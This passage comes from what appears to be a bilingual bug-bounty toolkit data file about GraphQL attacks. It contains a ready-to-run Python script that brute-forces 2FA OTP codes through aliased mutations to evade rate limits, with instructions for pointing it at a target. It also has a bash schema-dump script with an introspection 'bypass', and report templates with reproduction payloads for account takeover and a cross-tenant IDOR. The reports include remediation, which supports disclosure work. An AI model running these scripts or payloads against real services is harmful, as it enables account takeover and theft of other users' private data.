      hi: "GraphQL Aliases से 6-डिजिट OTP क्रैक करने वाली ऑटोमेटेड पायथन स्क्रिप्ट",
    },
    description: {
      en: "Generates chunks of 250 aliased mutations per HTTP POST request to bypass rate limiting and crack 2FA verification in seconds.",
      simple: "Sends 250 OTP guesses per single HTTP request to crack 2FA without triggering rate limits.",
      hi: "प्रति रिक्वेस्ट 250 OTP टेस्ट करके बिना रेट लिमिट के 2FA क्रैक करती है।",
    },
    category: "alias_generator",
    language: "python",
    code: `import requests
import json
import sys

TARGET_URL = "https://api.target.com/graphql"
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer TEMP_PRE_AUTH_TOKEN"
}

def crack_otp(start=0, end=9999, chunk_size=200):
    print(f"[*] Starting GraphQL Alias Brute-Force from {start:04d} to {end:04d}...")
    
    for i in range(start, end + 1, chunk_size):
        chunk_end = min(i + chunk_size, end + 1)
        sub_queries = []
        
        for code in range(i, chunk_end):
            code_str = f"{code:04d}" # Change to {code:06d} for 6-digit OTP
            sub_queries.append(f'c{code_str}: verifyOtp(code: "{code_str}") {{ success token }}')
            
        full_query = "mutation Crack2FA {\\n" + "\\n".join(sub_queries) + "\\n}"
        payload = {"query": full_query}
        
        try:
            r = requests.post(TARGET_URL, json=payload, headers=HEADERS, timeout=15)
            if r.status_code == 200:
                data = r.json().get("data", {})
                for alias_name, result in data.items():
                    if result and result.get("success") == True:
                        print(f"\\n[+] CRACKED! Winning OTP: {alias_name[1:]}")
                        print(f"[+] Token: {result.get('token')}")
                        return alias_name[1:]
            else:
                print(f"[-] HTTP Error {r.status_code} at chunk {i}")
        except Exception as e:
            print(f"[!] Error: {e}")
            
        sys.stdout.write(f"\\r[*] Tested up to code {chunk_end - 1:04d}...")
        sys.stdout.flush()
        
    print("\\n[-] Finished without match.")
    return None

if __name__ == "__main__":
    crack_otp()`,
    howToUse: {
      en: "Install requests: `pip install requests`. Replace TARGET_URL, HEADERS, and mutation signature with your target. Run: `python3 crack_graphql_otp.py`.",
      simple: "Update TARGET_URL and mutation name, then run `python3 crack_graphql_otp.py`.",
      hi: "TARGET_URL और म्यूटेशन का नाम बदलें, फिर `python3 crack_graphql_otp.py` रन करें।",
    },
  },
  {
    id: "graphql-schema-dumper",
    title: {
      en: "Bash One-Liner Introspection Dump to JSON & SDL",
      simple: "One-Click Tool to Download the Entire GraphQL API Schema",
      hi: "एक क्लिक में पूरा GraphQL स्कीमा डाउनलोड करने वाला बैश कमांड",
    },
    description: {
      en: "Downloads the entire introspection schema using curl, formats it using jq, and converts it to GraphQL SDL format for offline analysis.",
      simple: "Dumps the whole API documentation into a file on your computer.",
      hi: "पूरे API डॉक्यूमेंटेशन को कंप्यूटर में फाइल के रूप में सेव करता है।",
    },
    category: "schema_dumper",
    language: "bash",
    code: `#!/usr/bin/env bash
# Usage: ./dump_schema.sh https://api.target.com/graphql [OPTIONAL_AUTH_BEARER]

URL="\${1:-https://api.target.com/graphql}"
AUTH="\${2}"

HEADER_AUTH=""
if [ -n "$AUTH" ]; then
  HEADER_AUTH="-H 'Authorization: Bearer $AUTH'"
fi

echo "[*] Querying full introspection on $URL..."

curl -s -X POST "$URL" \\
  -H "Content-Type: application/json" \\
  $HEADER_AUTH \\
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}' \\
  -o schema_raw.json

if grep -q "__schema" schema_raw.json; then
  echo "[+] Introspection SUCCESS! Schema saved to schema_raw.json"
  echo "[*] Total Types Found: $(grep -o '"name":' schema_raw.json | wc -l)"
else
  echo "[-] Introspection blocked or disabled. Trying GET bypass..."
  curl -s -G "$URL" --data-urlencode 'query={__schema{types{name}}}' -o schema_get.json
fi`,
    howToUse: {
      en: "Make executable: `chmod +x dump_schema.sh` then run `./dump_schema.sh https://target.com/graphql`.",
      simple: "Run `./dump_schema.sh https://target.com/graphql` to save the schema.",
      hi: "`chmod +x dump_schema.sh` करके `./dump_schema.sh https://target.com/graphql` चलाएं।",
    },
  },
];

// ─── 4. P1/P2 REPORT TEMPLATES ────────────────────────────────────────────────
export const GRAPHQL_REPORT_TEMPLATES: GraphqlReportTemplate[] = [
  {
    id: "rep-graphql-batch-otp-takeover",
    title: {
      en: "Account Takeover via GraphQL Mutation Aliasing Bypassing 2FA Rate Limits",
      simple: "2FA Bypass and Full Account Takeover via GraphQL Aliases",
      hi: "GraphQL Aliasing से 2FA बाईपास और फुल अकाउंट टेकओवर",
    },
    vulnType: "CWE-307: Improper Restriction of Excessive Authentication Attempts",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1 - Critical)",
    severity: "critical",
    reportMarkdown: `## Summary:
The GraphQL endpoint at \`https://api.target.com/graphql\` is vulnerable to unrestricted authentication attempts via Mutation Aliasing. While the REST endpoint enforces a 5-attempt rate limit and temporary account lock, the GraphQL endpoint processes multiple aliased mutations inside a single HTTP request without incrementing the rate limiter counter.

This allows an unauthenticated attacker to brute-force a 6-digit Two-Factor Authentication (2FA) code or password reset token in less than 2 minutes, achieving complete pre-auth Account Takeover.

---

## Technical Details:
- **Vulnerable Endpoint:** \`POST https://api.target.com/graphql\`
- **Root Cause:** The rate-limiting middleware is applied at the HTTP reverse-proxy layer (1 request = 1 attempt counter), while the GraphQL execution engine resolves all aliased operations in a single execution context without per-field rate limits or complexity budget enforcement.

---

## Step-by-Step Reproduction:
1. Initiate a login flow for the victim account (\`victim@target.com\`) requiring 2FA OTP verification.
2. Intercept the request to verify the OTP in Burp Suite.
3. Instead of sending a single mutation, send 250 aliased mutations in a single POST body:

\`\`\`http
POST /graphql HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer <temp_token>

{
  "query": "mutation Crack2FA {
    c100001: verify2FA(code: \\"100001\\") { token error }
    c100002: verify2FA(code: \\"100002\\") { token error }
    c100003: verify2FA(code: \\"100003\\") { token error }
    ...
    c100250: verify2FA(code: \\"100250\\") { token error }
  }"
}
\`\`\`

4. Observe that the server returns HTTP 200 OK with results for all 250 codes without any rate limit warning or lockout.
5. In our automated test, code \`100142\` matched, returning the valid live session JWT \`ey...\` in alias \`c100142\`.

---

## Impact:
- **Severity:** Critical (9.1)
- Any attacker knowing a victim's email can bypass 2FA authentication and take over user accounts, including administrative accounts.

---

## Remediation Guidance:
1. **Enforce Query Cost / Complexity Analysis:** Utilize libraries like \`graphql-cost-analysis\` or \`graphql-validation-complexity\` to assign cost points to fields and reject queries exceeding a reasonable threshold (e.g. max cost 50).
2. **Field-Level Rate Limiting:** Enforce rate-limiting inside the mutation resolver function rather than exclusively at the HTTP ingress gateway.
3. **Disable Query Batching & Restrict Aliases:** If not required, limit the maximum number of aliases permitted in a single operation.`,
  },
  {
    id: "rep-graphql-node-idor-leak",
    title: {
      en: "Multi-Tenant Data Leak via Global Object Identification (Node Interface)",
      simple: "BOLA / IDOR in GraphQL Node Interface Exposing Customer Invoices",
      hi: "GraphQL Node Interface में IDOR जिससे सभी कस्टमर्स के इनवॉइस लीक हो रहे हैं",
    },
    vulnType: "CWE-639: Authorization Bypass Through User-Controlled Key (IDOR/BOLA)",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (7.7 - High)",
    severity: "high",
    reportMarkdown: `## Summary:
The GraphQL API implements Relay Global Object Identification via the root query \`node(id: ID!)\`. Although individual domain queries like \`getInvoice(id: ...)\` properly check tenant authorization, the generic \`node\` resolver lacks object-level authorization checks. 

Any low-privileged authenticated user can access confidential enterprise financial records, invoices, and credit card metadata belonging to any other customer in the database by submitting their globally unique Relay ID.

---

## Step-by-Step Reproduction:
1. Log into Tenant A using a standard non-admin account.
2. Note your own invoice ID in the URL, which is formatted in base64: \`SW52b2ljZToxMDE=\` (decodes to \`Invoice:101\`).
3. Craft an ID for Tenant B by encoding \`Invoice:102\` -> \`SW52b2ljZToxMDI=\`.
4. Issue the following query:

\`\`\`graphql
query ReadVictimInvoice {
  node(id: "SW52b2ljZToxMDI=") {
    id
    ... on Invoice {
      amount
      recipientEmail
      billingAddress
      pdfUrl
    }
  }
}
\`\`\`

5. The server responds with full private billing details belonging to Tenant B:

\`\`\`json
{
  "data": {
    "node": {
      "id": "SW52b2ljZToxMDI=",
      "amount": "$12,450.00",
      "recipientEmail": "finance@victim-enterprise.com",
      "billingAddress": "123 Corporate Way, NY",
      "pdfUrl": "https://target-invoices.s3.amazonaws.com/inv_102.pdf"
    }
  }
}
\`\`\`

---

## Remediation:
- Enforce tenancy checks inside the \`node\` root resolver before returning the underlying record. Ensure that \`context.currentUser.tenantId === record.tenantId\`.`,
  },
];
